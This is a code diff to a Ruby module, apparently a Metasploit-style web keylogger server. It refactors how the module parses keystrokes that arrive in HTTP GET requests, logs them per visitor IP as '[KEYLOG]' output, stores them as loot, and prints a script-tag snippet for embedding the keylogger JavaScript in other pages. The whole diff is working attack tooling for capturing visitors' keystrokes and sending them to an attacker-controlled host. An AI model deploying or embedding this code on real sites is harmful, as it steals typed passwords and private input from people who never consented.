@@ -92,28 +92,34 @@ EOS
 		return code
 	end
 
-	def log_parser(log)
-		@raw_log = ""
+	def log_parser(log,cli)
+		raw_log = ""
 		log.split(",").each do |char|
 			case char.to_i
 			# Do Backspace
 			when 8
-				if @raw_log.present?
-					if @raw_log[@raw_log.length - 4,@raw_log.length] == "<CR>"
-						@raw_log = @raw_log[0, @raw_log.length - 4]
-					elsif @raw_log[@raw_log.length - 5,@raw_log.length] == "<TAB>"
-						@raw_log = @raw_log[0, @raw_log.length - 5]
+				if raw_log.present?
+					if raw_log[raw_log.length - 4,raw_log.length] == "<CR>"
+						raw_log = raw_log[0, raw_log.length - 4]
+					elsif raw_log[raw_log.length - 5,raw_log.length] == "<TAB>"
+						raw_log = raw_log[0, raw_log.length - 5]
 					else
-						@raw_log = @raw_log[0, @raw_log.length - 1]
+						raw_log = raw_log[0, raw_log.length - 1]
 					end
 				end
 
-			when 9  then @raw_log += "<TAB>"
-			when 13 then @raw_log += "<CR>"
+			when 9  then raw_log += "<TAB>"
+			when 13 then raw_log += "<CR>"
 
 			else
-				@raw_log += char.to_s.hex.chr
+				raw_log += char.to_s.hex.chr
 			end
+		end
+
+		collect_keystrokes(cli.peerhost,current_time + " - " + raw_log + "\r\n")
+
+		if log.length > 1 
+			print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{raw_log}")
 		end
 	end
 
@@ -130,7 +136,8 @@ EOS
 
 	def cleanup 
 		super
-		unless @cleanup_has_run # This prevents cleanup running multiple times per host.
+		# This prevents cleanup running multiple times per host.
+		unless @cleanup_has_run 
 			@keystrokes_log.keys.each do |host|
 				path = store_loot("js.keylogger", "text/plain", host, @keystrokes_log[host])
 				print_status("Stored loot at #{path}")
@@ -150,32 +157,29 @@ EOS
 
 	# This handles the HTTP responses for the Web server
 	def on_request_uri(cli, request)
-		#@host = cli.peerhost
 		case request.uri
-			# Reply with JavaScript Source if *.js is requested
-			when /\.js/
+
+			# Reply with JavaScript Source
+			when /#{datastore['URIPATH']}\.js$/
 				content_type = "text/plain"
-				content = keylogger
-				send_response(cli, content, {'Content-Type'=> content_type})
+				send_response(cli, keylogger, {'Content-Type'=> content_type})
 				request_timestamp(cli,request)
-			when /demo/
+
+			#Reply with Demo Page
+			when /#{datastore['URIPATH']}\/demo$/
 				if datastore['DEMO']
-					content = demo
 					content_type = "text/html"
-					send_response(cli, content, {'Content-Type'=> content_type})
+					send_response(cli, demo, {'Content-Type'=> content_type})
 					request_timestamp(cli,request)
 				end
+
 			# JavaScript XML HTTP GET Request is used for sending the keystrokes over network.
 			when /#{datastore['URIPATH']}&/
 				content_type = "text/plain"
 				send_response(cli, @random_text, {'Content-Type'=> content_type})
 				log = request.uri.split("&")[1]
-				log_parser(log)
-				collect_keystrokes(cli.peerhost,current_time + " - " + @raw_log + "\r\n")
-				if log.length > 1 
-					print_good("#{cli.peerhost} - #{current_time} - [KEYLOG] - #{@raw_log}")
-				end
-			# Reply with Demo Page
+				log_parser(log,cli)
+ 
 			else
 				# Reply with 404 - Content Not Found
 				content = "Error 404 (Not Found)!"
@@ -198,15 +202,17 @@ EOS
 		@cleanup_has_run = false
 		@keystrokes_log = {} 
 		detect_http_mode
-		script_source = "#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}.js"
 
-		# Prints Demo Page
+		# Prints Demo Page Information
 		if datastore['DEMO']
-			print_status("Demonstration Form URL => %grn#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}/demo%clr")
+			demo_url = "#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}/demo"
+			print_status("Demonstration Form URL => %grn#{demo_url}%clr")
 		end
 
-		# Prints HTML Embed Code
-		print_status(" Keylogger <HTML> Code => %blu<script type=\"text/javascript\" src=\"#{script_source}\"></script>%clr")
+		# Prints HTML Snippet to Embed Javascript 
+		script_source = "#{@http_mode}#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{datastore['URIPATH']}.js"
+		javascript_embed_code = "<script type=\"text/javascript\" src=\"#{script_source}\"></script>"
+		print_status(" Keylogger <HTML> Code => %blu#{javascript_embed_code}%clr")
 
 		# Starts Web Server
 		exploit
